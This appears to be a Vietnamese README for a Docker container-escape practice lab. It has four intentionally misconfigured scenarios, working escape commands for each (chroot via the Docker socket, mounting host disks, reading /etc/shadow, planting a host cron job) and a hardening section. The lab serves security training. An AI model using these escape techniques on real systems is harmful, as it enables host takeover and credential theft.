# Docker Escape Lab 🐳🔓
### Môi trường thực hành Kỹ thuật Thoát khỏi Container & Cơ chế Cô lập Linux Kernel

<p align="center">
  <img src="https://img.shields.io/badge/Docker-20.10%2B-2496ED?style=for-the-badge&logo=docker&logoColor=white" alt="Docker" />
  <img src="https://img.shields.io/badge/Linux-Kernel_5.x%2B-FCC624?style=for-the-badge&logo=linux&logoColor=black" alt="Linux" />
  <img src="https://img.shields.io/badge/Security-Container_Escape-E95420?style=for-the-badge" alt="Security" />
  <img src="https://img.shields.io/badge/License-MIT-success?style=for-the-badge" alt="License MIT" />
</p>

<p align="center"><a href="README.md">English</a> · <strong>Tiếng Việt</strong></p>

> **TUYÊN BỐ TRÁCH NHIỆM PHÁP LÝ & ĐẠO ĐỨC:**  
> Dự án này cài đặt sẵn các kịch bản cố ý cấu hình sai nhằm phục vụ đào tạo bảo mật, nghiên cứu an ninh hạ tầng cloud và luyện tập CTF trên máy cá nhân cô lập. Tuyệt đối không áp dụng các kỹ thuật escape này lên bất kỳ hệ thống nào bạn không sở hữu hoặc chưa được cấp phép bằng văn bản.

---

## Giới thiệu

**Docker Escape Lab** tái hiện 4 kịch bản thoát khỏi container thực tế nhất dựa trên các lỗi cấu hình thường gặp trong thực tế vận hành DevOps, hạ tầng CI/CD và môi trường cloud:

| # | Kịch bản Escape | Lỗi cấu hình cốt lõi | Cơ chế kỹ thuật | Mức độ ảnh hưởng |
|---|---|---|---|---|
| 1 | **Docker Daemon Socket** | `-v /var/run/docker.sock:...` | Điều khiển API qua Unix Domain Socket | Tạo container mới mount ổ đĩa root của host (`chroot`) |
| 2 | **Chế độ Đặc quyền** | `privileged: true` | Can thiệp trực tiếp block devices của host | Mount phân vùng ổ cứng host (`/dev/sda`, `/dev/nvme`) |
| 3 | **Trùng PID Namespace** | `pid: host` + `SYS_PTRACE` | Đọc cấu trúc tiến trình qua `/proc` | Vượt qua ranh giới rootfs host qua `/proc/1/root` |
| 4 | **Mount Thư mục Nhạy cảm** | `-v /:/host:rw` | Quyền ghi trực tiếp lên filesystem host | Cài mã thực thi qua Cron / Bơm SSH Authorized Keys |

---

## Bắt đầu nhanh

### Yêu cầu
- Đã cài đặt Docker & Docker Compose v2 trở lên.
- Máy chủ Linux hoặc môi trường WSL2 trên Windows.

### Khởi chạy Lab

```bash
git clone https://github.com/Khanh1916/docker-escape-lab.git
cd docker-escape-lab
docker compose up -d
```

Kiểm tra trạng thái sẵn sàng của cả 4 container:

```bash
docker ps --format "table {{.Names}}\t{{.Status}}\t{{.Image}}"
```

---

## Hướng dẫn Khai thác từng Kịch bản

### Kịch bản 1: Lộ Docker Daemon Socket (`/var/run/docker.sock`)
Khi container có quyền truy cập socket Docker của host, nó nắm giữ quyền root trên toàn bộ Docker engine:

```bash
# Truy cập container mục tiêu
docker exec -it lab-sock-escape bash

# Cách 1: Sử dụng Docker CLI có sẵn
docker run --rm -it -v /:/host alpine chroot /host

# Cách 2: Sử dụng raw curl qua Unix socket (khi container không cài docker CLI)
curl -s --unix-socket /var/run/docker.sock http://localhost/version
```

### Kịch bản 2: Container chạy Đặc quyền (`--privileged`)
Ở chế độ privileged, thư mục `/dev` trong container phơi bày toàn bộ các ổ cứng vật lý và ảo của host:

```bash
# Truy cập container privileged
docker exec -it lab-privileged-escape bash

# Xem danh sách ổ đĩa của host
lsblk

# Mount trực tiếp phân vùng ổ đĩa host
mkdir -p /mnt/host_disk
mount /dev/sda /mnt/host_disk

# Đọc file mật khẩu băm của host
head -n 5 /mnt/host_disk/etc/shadow
```

### Kịch bản 3: Chia sẻ Host PID Namespace (`--pid=host`)
Chia sẻ PID namespace cho phép container thấy tiến trình khởi tạo của host (PID 1) và truy cập cây thư mục gốc của host qua procfs:

```bash
# Truy cập container
docker exec -it lab-pid-escape bash

# Kiểm tra các tiến trình của host
ps aux | head -n 10

# Duyệt thư mục gốc của host qua /proc/1/root
ls -la /proc/1/root/
cat /proc/1/root/etc/passwd
```

### Kịch bản 4: Mount Thư mục Nhạy cảm của Host (`/:/host:rw`)
Quyền ghi trực tiếp lên ổ cứng host cho phép leo thang thành quyền thực thi code trên host:

```bash
# Truy cập container
docker exec -it lab-volume-escape sh

# Thiết lập cron chạy mã trên host mỗi phút
echo "* * * * * root touch /tmp/host_escaped" > /host/etc/cron.d/pwn_cron
chmod 644 /host/etc/cron.d/pwn_cron
```

---

## Giải pháp Tăng cứng & Phòng thủ (Hardening)

1. **Khóa chặt Docker Socket:** Tuyệt đối không mount `/var/run/docker.sock` vào workload thông thường. Nếu cần theo dõi metrics, hãy dùng Docker Socket Proxy (`tecnativa/docker-socket-proxy`) ở chế độ chỉ đọc.
2. **Cấm hoàn toàn `--privileged`:** Áp dụng nguyên tắc Least Privilege: drop toàn bộ capabilities (`--cap-drop=ALL`) và chỉ cấp lại quyền thực sự cần thiết (`--cap-add=NET_BIND_SERVICE`).
3. **Bật Filesystem Chỉ đọc:** Khởi chạy container với cờ `--read-only`, mount thư mục tạm bằng `--tmpfs /tmp`.
4. **Bật User Namespaces (`userns-remap`):** Ánh xạ user root trong container sang một user bình thường không có quyền trên host.
5. **Chạy Rootless Docker hoặc Podman:** Chạy toàn bộ daemon dưới user thường để triệt tiêu nguy cơ chiếm root host.

---

## Dọn dẹp Môi trường

```bash
docker compose down
```

---

## Bài viết Chi tiết & Tác giả

Phân tích chuyên sâu về cơ chế kernel, phân tích log và hướng dẫn hardening chi tiết được xuất bản tại:
- **Blog Tech Notes:** [https://khanh1916.github.io/notes](https://khanh1916.github.io/notes)
- **Tác giả:** Nguyễn Nam Khánh ([@Khanh1916](https://github.com/Khanh1916))

## Giấy phép

Dự án phát hành dưới [Giấy phép MIT](LICENSE).
